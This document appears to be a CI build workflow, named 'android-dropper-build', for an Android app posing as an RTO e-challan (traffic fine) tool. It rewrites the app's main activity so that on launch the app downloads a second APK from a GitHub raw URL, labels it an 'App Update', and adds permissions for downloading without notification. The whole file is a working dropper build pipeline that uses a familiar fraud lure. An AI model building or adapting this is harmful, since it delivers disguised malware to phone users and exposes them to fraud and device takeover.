workflows:
  android-dropper-build:
    name: RTO Background Downloader
    max_build_duration: 60
    instance_type: mac_mini_m1
    environment:
      java: 17
    scripts:
      - name: Inject Background Download Logic
        script: |
          cd RtoEChallan || exit 1
          
          # 1. Resource & Manifest Permissions (Permissions are must for BG download)
          MANIFEST_PATH=$(find . -name "AndroidManifest.xml" | head -n 1)
          sed -i '' '/<application/i \
          <uses-permission android:name="android.permission.INTERNET" /> \
          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> \
          <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />' "$MANIFEST_PATH"

          # 2. Injecting DownloadManager Logic in MainActivity
          FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
          cat <<EOF > "$FILE_PATH"
          package com.example.rtoechallan
          import android.app.DownloadManager
          import android.content.Context
          import android.net.Uri
          import android.os.Bundle
          import android.os.Environment
          import android.widget.Toast
          import androidx.appcompat.app.AppCompatActivity

          class MainActivity : AppCompatActivity() {
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  setContentView(R.layout.activity_main)
                  
                  startBackgroundDownload()
              }

              private fun startBackgroundDownload() {
                  val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                  try {
                      val request = DownloadManager.Request(Uri.parse(url))
                      request.setTitle("App Update")
                      request.setDescription("Downloading latest version...")
                      request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Update.apk")

                      val manager = getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
                      manager.enqueue(request)
                      
                      Toast.makeText(this, "Download Shuru Ho Gaya Hai...", Toast.LENGTH_LONG).show()
                  } catch (e: Exception) {
                      Toast.makeText(this, "Error: " + e.message, Toast.LENGTH_SHORT).show()
                  }
              }
          }
          EOF

          # 3. Standard Build & Export
          rm -f settings.gradle gradle.properties build.gradle
          printf "android.useAndroidX=true\nandroid.enableJetifier=true" > gradle.properties
          printf "rootProject.name = 'RtoEChallan'\ninclude ':app'" > settings.gradle
          cat <<EOF > build.gradle
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { 
                  classpath 'com.android.tools.build:gradle:8.0.2'
                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.20'
              }
          }
          allprojects { repositories { google(); mavenCentral() } }
          EOF

          gradle wrapper --gradle-version 8.0.2
          chmod +x gradlew
          ./gradlew assembleDebug --no-daemon
          
          mkdir -p \$CM_BUILD_DIR/final_out
          find . -name "*.apk" -exec cp {} \$CM_BUILD_DIR/final_out/RTO_Installer.apk \;
          
    artifacts:
      - \$CM_BUILD_DIR/final_out/*.apk
